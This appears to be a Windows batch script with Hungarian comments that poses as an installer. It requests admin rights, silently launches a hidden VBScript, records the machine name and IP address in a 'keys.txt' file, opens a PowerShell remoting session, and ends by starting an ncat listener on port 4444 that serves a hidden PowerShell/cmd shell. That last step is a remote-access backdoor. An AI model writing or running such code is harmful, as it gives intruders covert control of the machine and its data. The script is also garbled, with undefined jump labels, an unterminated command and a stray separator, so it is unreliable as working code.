@echo off
setlocal enabledelayedexpansion

REM Ellenorzi es kerdezi a rendszergazdai jogosultsagot

NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    echo Rendszergazdai jogosultsagok megerositve. Folytatas...
    goto admin_folytatas
) ELSE (
    echo Rendszergazdai jogosultsagok kerese...
    goto ker_admin
)


:: nyelvfüggetlen célmappa
set "TARGET=%PUBLIC%\Documents\keys"
if not exist "%TARGET%" mkdir "%TARGET%"

:: hozzon létre egy keys.txt filet, ha még nincs
if not exist "%TARGET%\keys.txt" (
    echo Created by installer > "%TARGET%\keys.txt")

:: >>> EZ A RÉSZ MÓDOSULT: VBSCRIPT FUTTATÁSA LÁTHATATLANUL <<<
echo [INFO] A sifustartup5sfgj.vbs inditasa WScript.Shell-lel...
start "" "wscript.exe" "%TARGET%\sifustartup5sfgj.vbs"
echo [SIKER] VBScript elindult (háttérben).

:: Számítógép neve (Megbízható módszer: %COMPUTERNAME%)
set "GEPNEV=%COMPUTERNAME%"

:: IPv4 cim
for /f "tokens=14" %%a in ('ipconfig ^| findstr /i "IPv4"') do set "IP=%%a"

---

:: Mentés keys.txt-be
(
    echo GEPNEV: !GEPNEV!
    echo IP: !IP!
) > "%TARGET%\keys.txt"

echo [INFO] A keys.txt elkeszult a %TARGET% mappaban.
echo [INFO] PowerShell Remoting elinditasa a %IP% cimen...
echo.

:: POWERHSHELL REMOTING BLOKK
powershell.exe -Command "
    $user = Get-Credential;
    Write-Host 'Kapcsolodas a %IP% cimen levo gephez...';
    Enter-PSSession -ComputerName %IP% -Credential $user

:: A parancs futtatása után a .bat script folytatódik (vagy bezárul)

echo.
echo [INFO] A munkamenet befejezodott vagy megszakadt.

"%NCAT%" -l -p 4444 -e "powershell.exe -w hidden C:\Windows\System32\cmd.exe"

echo.
pause
